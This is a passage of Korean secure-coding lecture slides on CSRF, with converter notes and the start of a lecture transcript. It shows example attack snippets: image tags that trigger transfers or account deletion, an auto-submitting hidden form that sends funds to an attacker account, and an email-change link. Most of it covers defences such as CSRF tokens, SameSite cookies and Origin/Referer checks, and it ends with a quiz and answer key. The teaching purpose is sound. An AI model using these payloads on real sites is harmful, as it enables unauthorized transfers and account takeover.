→ 공격자가 악의적인 페이지에서 동일 도메인의 요청을 보내면, 사용자 인증 정보가 함께 전송되어 정상 요청으로 인식됨
요청 검증 부재
서버 측에서 요청의 출처(origin)나 referer를 검증하지 않거나, CSRF 토큰과 같은 추가 검증 절차 미적용
GET 요청 등 상태 변경에 사용되는 요청이 별도의 확인 없이 처리되는 경우
취약한 쿠키 설정
쿠키에 SameSite 속성이 적용되지 않으면, 타 도메인에서의 요청에도 쿠키가 전송될 수 있음

---

## [2-SLIDES] 7주차 3차시 p.7 · CSRF 취약점 공격 흐름
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사이트가 신뢰하는 사용자(인증된 사용자)의 세션을 통해, 공격자가 원하는 명령(공격자에게는 인가되지 않은)을 대신 실행하도록 한다.

페이지에 숨겨놓은 악의적인 공격(form문과 자바스크립트를 이용)으로 원하지 않는 악의적인 액션을 서버로 요청한다.

예를 들면, 숨겨둔 공격코드를 적은 게시판 글을 관리자가 누르면 관리자의 권한으로 form문을 실행시켜 어떤 액션을 수행하는 것이다.

**[도식: CSRF 공격 흐름 — 공격자(왼쪽 아래) / 웹 서버(가운데 위) / 사용자(오른쪽 아래)]**

| 단계 | 방향 | 화살표 라벨 |
|---|---|---|
| ① | 공격자 → 웹 서버 (공격자에서 위로 올라가 오른쪽 웹 서버로) | ① 크로스사이트 요청 위조 (CSRF) 공격 코드 등록 |
| ② | 사용자 → 웹 서버 (사용자에서 위로 올라가 왼쪽 웹 서버로) | ② CSRF Script가 포함된 페이지 요청 |
| ③ | 웹 서버 → 사용자 (웹 서버 아래로 내려가 오른쪽 사용자로) | ③ Response |
| ④ | 사용자 → 웹 서버 (사용자 PC에서 대각선으로 웹 서버로, 그라데이션 선) | ④ CSRF에 의해 사용자의 권한으로 서비스 요청 |

- 공격자 아이콘: 선글라스 낀 사람 + 노트북, 라벨 "공격자". 웹 서버 아이콘: 서버 랙, 라벨 "웹 서버". 사용자 아이콘: 데스크톱 PC + 사람, 라벨 "사용자".
- 공격자에게서 나오는 생각 풍선(점선 구름) 안의 글:
  > URL이나 파라미터 조작을 통해 직접적으로 서버에 요청을 전송하여 처리상태를 확인한다.

  (즉, 공격자는 먼저 자신이 직접 URL/파라미터를 조작해 요청을 보내 보며 어떤 요청이 어떤 처리를 일으키는지 확인한 뒤, 그 요청을 공격 코드로 만들어 게시판 등에 등록함)

---

## [2-SLIDES] 7주차 3차시 p.8 · CSRF 취약점 공격 흐름
CSRF 취약점 공격 흐름
1. 사용자가 중요한 웹 서비스(예:은행, 증권)로 로그인
세션 쿠키가 사용자 웹 브라우저에 저장됨
2. 악성 링크 클릭
이메일 또는 게시판에 게시된 가짜 사이트 주소를 클릭
- 이미지 로드시 동작
<img src="https://bank.com/transfer?to=hacker&amount=1000000">
- 숨겨진 iframe 로드시 무단 '좋아요' 클릭 동작
<iframe src="http://sns.com/like?postId=434">
3. 공격자 사이트가 사용자의 웹 브라우저를 통해 로그인 되어 있던 중요한 웹 서비스에 요청 전송
- 자동으로 저장되어 있던 세션 쿠키를 해당 사이트로 전송
4. 중요한 웹 사이트는 정상 사용자의 요청이라고 인식하므로 민감한 동작(예:계좌이체) 수행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python `urllib.parse`로 두 URL을 분해 — `https://bank.com/transfer` 경로에 쿼리 `to=hacker`, `amount=1000000`(100만), `http://sns.com/like` 경로에 `postId=434`. `<img>`·`<iframe>`의 `src`는 페이지 로드 시 브라우저가 자동으로 GET 요청을 보내므로, 클릭 없이도 이 상태 변경 요청이 쿠키와 함께 전송됨 — 슬라이드 설명과 일치)

---

## [2-SLIDES] 7주차 3차시 p.9 · CSRF와 XSS의 차이점
CSRF와 XSS의 차이점
XSS(크로스 사이트 스크립팅)
공격자가 웹 사이트에 악성 스크립트를 삽입, 사용자의 웹 브라우저에서 실행
주로 브라우저 내 스크립트 조작 및 쿠키 탈취, UI 변조에 활용
CSRF(크로스 사이트 요청 위조)
공격자가 사용자 대신 다른 웹 사이트에 요청을 보내도록 유도
서버 입장에서 사용자 의도와 무관한 요청을 정상 요청으로 오인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[그림: XSS vs CSRF 비교 일러스트 (오른쪽 아래)]**

- 하늘색 배경에 검은 캐릭터 두 명.
- 왼쪽 캐릭터: 몸에 **"XSS"**, 손에 **`<script>`** 팻말을 들고 브라우저 창(점 3개 탭, 입력창) 앞에 서 있음 → 웹 페이지에 스크립트를 삽입하는 공격.
- 오른쪽 캐릭터: 몸에 **"CSRF"**, 뒤에는 **Login** 버튼이 있는 로그인 화면 모니터. XSS 캐릭터가 오른쪽 캐릭터 쪽으로 **"FAKE FORM"** 종이를 내밀고 있음 → 위조된 폼(요청)으로 로그인된 사용자의 권한을 악용하는 공격.

---

## [2-SLIDES] 7주차 3차시 p.10 · CSRF 공격 사고 사례
CSRF 공격 사고 사례

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처: 보안뉴스 기사 — 슬라이드 본문은 제목뿐이고 내용 전체가 이미지]**

- 사이트: 보안뉴스(왼쪽 위 '시큐리티월드' 로고), 경로 Home > 전체기사
- 기사 제목: **워드프레스의 플러그인에서 위험한 CSRF 취약점 발견돼**
- 입력: 2020-04-29 17:12, 보안뉴스 문가용 기자

(※ 기사 본문은 저작권상 원문 대신 요지만 옮김 — 빨간 박스로 강조된 부분 포함)

**[빨간 박스 1 — 부제목 요지]** '실시간 찾기 및 바꾸기(Real-Time Find and Replace)' 플러그인(HTML 콘텐츠를 쉽게 교체해 주는 기능)에 CSRF 취약점이 있어 공격자도 HTML 콘텐츠를 바꿀 수 있으며, 4.0.2 버전으로 업데이트가 필요하다는 내용. (※ 원문 부제목에 '통해'가 '토해'로 오타)

**[본문 요지]**
- 이 플러그인은 워드프레스 관리자가 테마·플러그인 등의 HTML 콘텐츠를 원하는 대로 교체하게 해 주는 오픈소스 플러그인으로, 약 10만 회 다운로드됨. (※ 원문에 '워드프레스'가 '워드프레서'로 오타)
- **[빨간 박스 2 요지]** 발견된 취약점은 CSRF로 분류되며 XSS 공격으로 이어짐 — 익스플로잇에 성공하면 공격자가 악성 자바스크립트를 사이트에 주입할 수 있음. 단, 사이트 관리자가 특정 링크를 클릭하거나 파일을 내려받게 하는 '속임수'가 먼저 성공해야 함.
- 취약점을 발견한 워드프레스 보안 업체 데피안트(Defiant)에 따르면, 핵심 기능인 '찾기 및 교체 규칙 추가하기'가 `far_options_page` 함수 안에 있는데 이 함수가 **요청의 출처를 제대로 확인하지 않는 것**이 CSRF 취약점의 정체.

- 강의 맥락 요점: 관리자 권한으로 실행되는 설정 변경 기능(`far_options_page`)이 요청 출처(CSRF 토큰/nonce 등)를 검증하지 않아, 관리자가 공격자 링크를 클릭하면 공격자가 원하는 '찾기·교체 규칙'(악성 JS 삽입)이 관리자 권한으로 등록됨 → CSRF가 저장형 XSS로 이어진 사례. 패치 버전 4.0.2.

---

## [2-SLIDES] 7주차 3차시 p.11 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.12 · CSRF 공격 기법
CSRF 공격 기법
CSRF 공격의 기본 원리
공격자가 악의적인 웹 페이지나 이메일 등을 통해 피해자의 브라우저로 타깃 사이트에 의도치 않은 요청을 보내도록 유도
→ 피해자의 인증 쿠키가 자동으로 포함되어, 서버는 정상 요청으로 처리
주요 공격 기법
- GET 요청 기반 공격
이미지 태그, 링크, 스크립트를 이용해 GET 요청을 강제 실행
(예) <img src="https://target.com/deleteAccount?user=123" />
- POST 요청 기반 공격
숨겨진 폼과 자바스크립트를 이용해 POST 요청을 자동 제출
(예) HTML 폼을 auto-submit 처리하여 중요한 작업(예: 자금 이체)을 실행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python으로 URL 분해 — `https://target.com/deleteAccount` 경로, 쿼리 `user=123`. `<img>` 태그는 렌더링 시 src로 GET 요청을 자동 전송하므로 계정 삭제 같은 상태 변경을 GET으로 처리하는 서버라면 쿠키와 함께 실행됨 — 일치)

---

## [2-SLIDES] 7주차 3차시 p.13 · CSRF 공격 기법
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.13 · 예시 1: GET 요청을 이용한 CSRF

공격자 페이지 코드

```html
 공격자가 피해자에게 보낼 악의적 링크 예시 
<img src="https://target.com/action?param=value" alt="image" />
```

피해자가 해당 페이지를 로드하면, 브라우저가 자동으로 GET 요청을 보내고, 서버는 피해자의 쿠키와 함께 요청을 처리

### [2-SLIDES] 7주차 3차시 p.13 · 예시 2: POST 요청을 이용한 CSRF (숨겨진 폼 & 자동 제출)

공격자 페이지 코드

```html
<form id="csrfForm" action="https://target.com/transferFunds" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="toAccount" value="attackerAccount">
</form>
<script>
  // 페이지 로드 시 폼 자동 제출
  document.getElementById("csrfForm").submit();
</script>
```

피해자가 페이지를 방문하면 폼이 자동으로 제출되어, 피해자의 인증 쿠키를 포함한 POST 요청이 실행

(※ 검증: Python `html.parser`로 예시 2 폼을 파싱 — `POST https://target.com/transferFunds`, 전송 본문(application/x-www-form-urlencoded)은 `amount=1000&toAccount=attackerAccount`, `getElementById("csrfForm")`의 id가 폼 id와 일치 — 일치. 예시 1의 URL은 `/action` 경로 + `param=value` 쿼리)

---

## [2-SLIDES] 7주차 3차시 p.14 · CSRF 공격 기법
CSRF 공격 기법
예시 3: 링크 클릭을 유도하는 사회공학적 CSRF
공격자가 피해자에게 URL을 포함한 메시지(예: 이메일, SNS)를 보내어 클릭을 유도
(예) https://target.com/updateEmail?newEmail=attacker@example.com
피해자가 링크를 클릭하면, 피해자의 인증 정보와 함께 요청이 실행되어 이메일 변경 등의 작업이 이루어짐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python `urllib.parse`로 분해 — 경로 `/updateEmail`, 쿼리 `newEmail=attacker@example.com` 한 개. 쿼리 안의 `@`는 인코딩(`%40`) 없이도 정상 파싱됨 — 일치. 이메일이 공격자 주소로 바뀌면 '비밀번호 찾기'로 계정 탈취까지 이어질 수 있는 대표 시나리오)

---

## [2-SLIDES] 7주차 3차시 p.15 · CSRF 공격이 가능한 취약한 웹 사이트
CSRF 공격이 가능한 취약한 웹 사이트
상태 기반 인증 사용
사용자 로그인 후, 세션 쿠키를 통해 인증 상태 유지
(브라우저는 모든 요청에 대해 자동으로 쿠키를 전송)
부적절한 요청 검증
CSRF 토큰 미사용 또는 검증 로직 부재
Origin 또는 Referer 헤더 검증이 없는 경우
GET/POST 불분명한 구분
상태 변경 작업(예: 계정 삭제, 이메일 변경, 자금 이체 등)이 GET 요청으로도 수행됨
POST 요청의 경우에도 별도의 CSRF 보호 없이 처리

---

## [2-SLIDES] 7주차 3차시 p.16 · CSRF 공격이 가능한 취약한 웹 사이트
CSRF 공격이 가능한 취약한 웹 사이트
입력 데이터 검증 미흡
사용자 입력(폼 데이터, URL 파라미터 등)을 검증 없이 처리
공격자가 임의의 값을 주입할 수 있음
자동화된 요청 검증 미흡
자동 제출 폼 또는 URL 링크를 통한 요청 전송
- GET 방식: <img src="https://vulnerable.com/deleteAccount?userId=123" />
- POST 방식: 숨겨진 폼이 별도의 CSRF 보호 없이 자동 제출됨
민감 작업에 대한 보호 미흡
중요 작업(계좌 이체, 비밀번호 변경 등)을 위한 추가 확인 절차 부재
사용자 의도와 관계없이 요청이 실행될 수 있음

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python으로 URL 분해 — `https://vulnerable.com/deleteAccount`, 쿼리 `userId=123` — 일치. 12쪽 예시는 파라미터명이 `user=123`, 이 쪽은 `userId=123`으로 서로 다른 가상 예시임)

---

## [2-SLIDES] 7주차 3차시 p.17 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.18 · CSRF 토큰 적용 및 활용
CSRF 토큰 적용 및 활용
Spring Security의 CSRF 보호
기본적으로 CSRF 보호 기능이 활성화되어 있으며, HttpSession에 CSRF 토큰을 저장
웹 폼에 자동으로 CSRF 토큰이 포함되어, 폼 제출 시 서버에서 토큰을 검증
토큰 검증 실패 시 요청이 차단되어, CSRF 공격을 방지
CSRF 보호 동작 방식
- 서버에서 토큰 생성: 사용자 세션 생성 시, CSRF 토큰이 함께 생성됨
- 클라이언트에서 토큰 포함: 폼, AJAX 요청 등 모든 상태 변경 요청에 CSRF 토큰이 숨겨진 필드나 HTTP 헤더로 포함됨
- 서버에서 토큰 검증: 요청에 포함된 토큰과 세션에 저장된 토큰을 비교하여 유효성을 확인
유의 사항
REST API와 같이 상태 비저장(stateless) 환경에서는 별도의 토큰 처리 전략 필요

---

## [2-SLIDES] 7주차 3차시 p.19 · CSRF 토큰 적용 및 활용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.19 · Spring Security Java Configuration 예시

```java
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf() // CSRF 보호 활성화 (기본값)
            .and()
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            .and()
            .formLogin()
                .loginPage("/login")
                .permitAll();
    }
}
```

- 캡처에서 `.csrf()` 바로 옆에 **빨간 별표(☆)**가 그려져 강조됨 — CSRF 보호가 켜지는 지점.

### [2-SLIDES] 7주차 3차시 p.19 · HTML FORM에 CSRF 토큰 적용 (Thymeleaf 예시)

Thymeleaf 환경에선 자동으로 히든 필드로 추가됨

```html
<form th:action="@{/update}" method="post">
    <input type="text" name="data" />
     Spring Security가 자동으로 CSRF 토큰 숨은 필드로 삽입 
    <button type="submit">제출</button>
</form>
```

### [2-SLIDES] 7주차 3차시 p.19 · AJAX 요청에서 CSRF 토큰 사용

1) HTML 생성시 meta 태그에서 토큰 이름과 값을 넣어 보냄
2) 스크립트에서 meta 태그의 토큰 이름/내용을 가져와 포함시켜 전송

```html
 CSRF 토큰 메타 태그 
<meta name="_csrf"        content="${_csrf.token}" />
<meta name="_csrf_header" content="${_csrf.headerName}" />

<script>
  // 메타 태그에서 토큰·헤더명 추출
  const token  = document.querySelector('meta[name="_csrf"]').content;
  const header = document.querySelector('meta[name="_csrf_header"]').content;

  // AJAX 요청 (fetch)
  fetch('/api/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      [header]: token
    },
    body: JSON.stringify({ hello: 'world' })
  });
</script>
```

(※ 검증: 세 코드의 괄호·중괄호 짝을 Python으로 확인 — 모두 균형, 일치. `[header]: token`은 JS 계산된 속성명이라 헤더 이름이 meta 값(Spring 기본값 `X-CSRF-TOKEN`)으로 들어감. 참고: ① `WebSecurityConfigurerAdapter`는 Spring Security 5.7에서 deprecated, 6.0에서 제거되었고 `antMatchers`도 6.0에서 `requestMatchers`로 대체됨 — 이 Java 예시는 Spring Boot 2.x / Security 5.x 기준 문법. Security 6.x에서는 `SecurityFilterChain` 빈과 `http.csrf(Customizer.withDefaults())` 형태로 작성. ② meta 태그의 `content="${_csrf.token}"`는 JSP(EL) 문법이며, Thymeleaf에서는 `th:content="${_csrf.token}"`처럼 `th:` 속성을 써야 값이 치환됨. ③ Thymeleaf는 `th:action` + `method="post"` 폼에 `_csrf` hidden 필드를 자동 삽입 — 슬라이드 설명과 일치)

---

## [2-SLIDES] 7주차 3차시 p.20 · SameSite Cookie 정책 설정
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.20 · SameSite Cookie란?
- 브라우저에서 웹 요청 시 어떤 조건 하에 쿠키가 함께 전송될지 제어하는 속성
- CSRF 공격 등 외부 사이트에서의 악의적 요청으로부터 보호

### [2-SLIDES] 7주차 3차시 p.20 · 주요 속성 값
- **Strict**
  - 쿠키가 오직 동일 사이트 내 요청에만 전송됨
- **Lax**
  - 최초 타 사이트 접속하는 경우만 전송하고 그 외 크로스사이트 요청들엔 차단
- **None**
  - 모든 요청에서 쿠키 전송
  - 반드시 Secure 플래그와 함께 사용해야 함

### [2-SLIDES] 7주차 3차시 p.20 · CSRF 대응 효과
다른 도메인으로부터의 요청에 쿠키가 자동으로 포함되지 않아, CSRF 공격 위험 감소

```http
HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=ABC123DEF456; Path=/; HttpOnly; SameSite=Strict
```
(박스 안에서 `SameSite=Strict`가 굵게 강조됨)

(※ 검증: Python `http.cookies.SimpleCookie`로 Set-Cookie 값을 파싱 — 이름 `JSESSIONID`, 값 `ABC123DEF456`, `path=/`, `httponly=True`, `samesite=Strict` — 일치. 보충: Lax의 정확한 동작은 "다른 사이트에서 링크 클릭 등 최상위(top-level) 이동 + 안전한 메서드(GET)일 때만 쿠키 전송, `<img>`·`<iframe>`·POST 폼 등 크로스사이트 하위 요청에는 미전송". 그래서 Lax만으로도 8·13쪽의 img/POST 자동 제출 공격은 막히지만, 14쪽처럼 GET 링크 클릭으로 상태가 바뀌는 기능은 여전히 위험. 최신 Chrome 등은 SameSite 미지정 쿠키를 Lax로 취급)

---

## [2-SLIDES] 7주차 3차시 p.21 · SameSite Cookie 정책 설정
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.21 · Spring Boot 설정 예시

application.properties 파일에 지정하는 경우

```properties
server.servlet.session.cookie.same-site=strict
```

Java Config를 사용하는 경우

```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setSameSite("Strict"); // 'Lax' 또는 'None' 사용 가능
    serializer.setUseSecureCookie(true); // 'None' 설정 시 반드시 true
    return serializer;
}
```

### [2-SLIDES] 7주차 3차시 p.21 · Node.js (Express) 설정 예시

```javascript
app.use(cookieParser());
app.use((req, res, next) => {
  res.cookie('sessionId', 'your-session-value', {
    sameSite: 'lax',  // 'strict' 또는 'none' (none 사용 시 secure:true 필수)
    secure: true      // HTTPS 환경에서만 쿠키 전송
  });
  next();
});
```

(※ 검증: 괄호·중괄호 짝을 Python으로 확인 — 두 코드 모두 균형, 일치. 참고: `server.servlet.session.cookie.same-site` 속성은 Spring Boot 2.6+에서 지원(값 none/lax/strict). `CookieSerializer`/`DefaultCookieSerializer`는 Spring Session 모듈 클래스라 Spring Session을 쓸 때 세션 쿠키에 적용되며, 기본 SameSite 값은 `Lax`. 브라우저는 `SameSite=None`인데 `Secure`가 없는 쿠키를 거부하므로 주석의 "None 설정 시 반드시 true/secure:true 필수"는 맞음. Express 예시는 `cookie-parser` 미들웨어를 쓰며 모든 응답마다 `sessionId` 쿠키를 다시 설정하는 단순 예시)

---

## [2-SLIDES] 7주차 3차시 p.22 · Origin/Referer 검증 및 세션 관리 보안 강화
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.22 · Origin/Referer 검증의 개념
- HTTP 요청 헤더의 Origin/Referer 값을 확인하여, 요청이 올바른 출처(도메인)에서 발생했는지 검증
- 공격자가 외부 사이트에서 악의적 요청을 보내는 것을 사전에 차단하는 역할

### [2-SLIDES] 7주차 3차시 p.22 · 필요성
- CSRF 공격 및 핫링크(Hotlinking)와 같은 외부 위협을 감소시킴
- 민감한 기능(예: 결제, 계정 변경 등)에 대한 요청이 예상된 출처에서 발생했음을 보장

### [2-SLIDES] 7주차 3차시 p.22 · 구현 방법 예시
**서버 측 로직**
- 요청이 들어올 때, Origin/Referer 헤더 값을 확인하고, 사전에 정의된 화이트리스트(예: https://www.예상도메인.com)와 비교
- 일치하지 않는 경우 요청 거부 혹은 에러 처리

(예시)
```java
// 간단 CSRF 검사: Origin 또는 Referer 확인
String origin = request.getHeader("Origin");
String referer = request.getHeader("Referer");
if ((origin != null && origin.equals("https://www.예상도메인.com")) ||
    (referer != null && referer.startsWith("https://www.예상도메인.com"))) {
    chain.doFilter(request, response);
} else {
    response.sendError(HttpServletResponse.SC_FORBIDDEN, "CSRF 차단");
}
```

(※ 검증: 괄호 짝 균형 확인, 그리고 같은 조건식을 Python으로 시뮬레이션 — Origin 일치 → 통과, Referer가 `https://www.예상도메인.com/pay` → 통과, Origin `https://evil.com` → 403(`SC_FORBIDDEN`=403), 두 헤더 모두 없음 → 403. **주의할 점 2가지:** ① `referer.startsWith("https://www.예상도메인.com")`는 `https://www.예상도메인.com.evil.com/attack` 같은 공격자 도메인도 통과시킴(시뮬레이션에서 ALLOW) → 끝에 `/`를 붙여 비교하거나 URL을 파싱해 호스트를 정확히 비교해야 안전. ② 실제 브라우저는 한글 도메인을 Punycode로 보내므로(`www.예상도메인.com` → `www.xn--hq1bm8j7zfn3fx1b.com`, Python idna 인코딩) 한글 문자열 그대로 비교하면 실제로는 일치하지 않음 — 예시용 표기로 이해)

---

## [2-SLIDES] 7주차 3차시 p.23 · 요약 정리
요약 정리
- CSRF는 로그인된 세션 쿠키를 악용해 사용자가 의도치 않은 요청을 보내도록 유도하는 취약점이다.
- 피싱 링크나 악성 웹페이지로 사용자를 유도해, 브라우저 자동 전송 쿠키를 이용한 요청이 발생한다.
- 이미지·폼·링크 등을 통해 계정 변경, 자금 이체 등 민감 동작이 자동 실행될 수 있다.
- CSRF 토큰·SameSite 쿠키·Referer/Origin 검증을 병행 적용해 공격 표면을 최소화해야 한다.

---

## [2-SLIDES] 7주차 3차시 p.24 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 3차시 p.25 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 3차시 p.26 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ?
   1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
   2) 서버가 Referer 검증을 엄격하게 적용해야 한다.
   3) CSRF 토큰을 매 요청마다 발급해야 한다.
   4) 브라우저가 SameSite=Strict로 쿠키를 설정해 둬야 한다.

2. 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ?
   1) CSRF 토큰을 사용해 요청 시 고유 값 검증
   2) SameSite 쿠키로 외부 도메인에서 쿠키 자동 전송 제한
   3) Referer/Origin 검사로 출처가 올바른지 확인
   4) 암호화된 비밀번호로 로그인 처리

3. CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동 전송되지 않도록 제한하기 위해 사용하는 속성은 ?

   (            )

---

## [2-SLIDES] 7주차 3차시 p.27 · 퀴즈 정답
퀴즈 정답
1. 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ?
1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
공격이 성립하려면, 사용자가 로그인 중이라 브라우저가 쿠키를 전송해야 합니다.
2. 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ?
4) 암호화된 비밀번호로 로그인 처리
비밀번호 암호화는 인증 과정 보안이지만, CSRF 방어 기법과는 직접 관련이 없습니다.
3. CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동
전송되지 않도록 제한하기 위해 사용하는 속성은 ?
( SameSite )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(정답 표시: 1번 "1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.", 2번 "4) 암호화된 비밀번호로 로그인 처리", 3번 괄호 안 "SameSite"가 빨간 글씨로 표시됨. ※ 검증: 26쪽 보기와 대조 — 1번의 2)·3)·4)는 모두 방어 측 조치라 공격 성립 조건이 아니고, 2번의 1)~3)은 18~22쪽에서 다룬 방어 기법(토큰·SameSite·Origin/Referer)이므로 정답 1 / 4 / SameSite — 일치)

---

# [3-TRANSCRIPT] 7주차 1차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin · CORS/코어스/Cross-Origin/교차 출처 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

[7주차 1차시 00:00] 실시할 예정이고요. LMS 플랫폼 통해서 온라인 실시간으로 진행할 예정이고 관련 공지사항 업로드 하였으니 반드시 확인하시고 [불명확 U0001]
[7주차 1차시 00:13] 시간에 맞춰서 시험 응시할 수 있도록 유의하시길 바랍니다.
[7주차 1차시 00:24] 이번 차시에서 학습할 내용은 프론트엔드 데이터 처리입니다.
[7주차 1차시 00:32] 총 3가지 주제로 나눠서 진행하도록 하겠습니다.
[7주차 1차시 00:40] 학습 목표입니다.
[7주차 1차시 00:43] 먼저 웹 애플리케이션에서 프론트엔드 데이터 처리가 보안에 미치는 영향에 대해 알아보고
[7주차 1차시 00:50] 클라이언트 측에서 발생할 수 있는 보안 취약점에 대해 학습하도록 하겠습니다.
[7주차 1차시 00:57] 아울러 보안 강화를 위한 프론트엔드 개발 및 데이터 처리 방법도 알아보도록 하겠습니다.
[7주차 1차시 01:08] 이에 따른 학습 내용은 다음과 같이 프론트엔드의 데이터 처리 개념과 보안 이슈, 그리고 보안 개발 방법입니다.
[7주차 1차시 01:20] 그럼 첫 번째 프론트엔드 데이터 처리 개념부터 한번 살펴보도록 하겠습니다.
[7주차 1차시 01:30] 우선 클라이언트와 서버 구조에 대한 기본 정의와 개념부터 보도록 하겠습니다.
[7주차 1차시 01:37] 클라이언트는 사용자의 요청을 서버로 전송하는 위치이며
[7주차 1차시 01:42] 일반적으로는 이를 받아들일 수 있는 사용자 인터페이스를
[7주차 1차시 01:46] 웹 또는 모바일 환경에서 제공하는 프론트엔드 영역입니다.
[7주차 1차시 01:52] 사용자가 버튼을 클릭하거나 폼 형태로 입력 양식을 서브밋하면
[7주차 1차시 01:56] 이를 서버로 전송하는 방식입니다.
[7주차 1차시 02:00] 서버는 클라이언트의 요청을 처리하고
[7주차 1차시 02:02] 필요한 데이터를 생성하거나 제공하는 백엔드 시스템 쪽을 이야기합니다.
[7주차 1차시 02:09] 양쪽 간에는 다양한 통신 방식이 존재하겠지만
[7주차 1차시 02:12] 최근에는 거의 HTTP 기반, 특히 HTTPS 방식으로 통일되어 가고 있습니다.
[7주차 1차시 02:20] 이런 구조는 역할이 분리되기 때문에 각자 역할에 집중할 수 있어서 확장성과 유연성을 높여줍니다.
[7주차 1차시 02:29] 또한 모든 처리가 서버에 집중되어 있기 때문에 특별한 로직 추가 없이 단순히 확장시키는 것만으로 대규모의 클라이언트 요청을 처리할 수도 있습니다.
[7주차 1차시 02:44] 통신 흐름은 클라이언트가 요청하는 1단계, 서버가 처리하는 2단계, 그 응답이 되돌아오는 3단계가 가장 기본적인 형태라고 볼 수 있습니다.
[7주차 1차시 02:59] 프론트엔드는 사용자와 직접 맞닿아 있는 부분이기 때문에 그렇게 이름이 지어졌다고 합니다.
[7주차 1차시 03:10] 예를 들어 브라우저에서 동작하는 HTML, CSS, JavaScript 코드 영역이 바로 프론트엔드에 해당합니다.
[7주차 1차시 03:20] 사용자가 입력한 데이터를 검증하고 서브로 전달하는 과정이 프론트엔드의 중요한 역할 중 하나인데요.
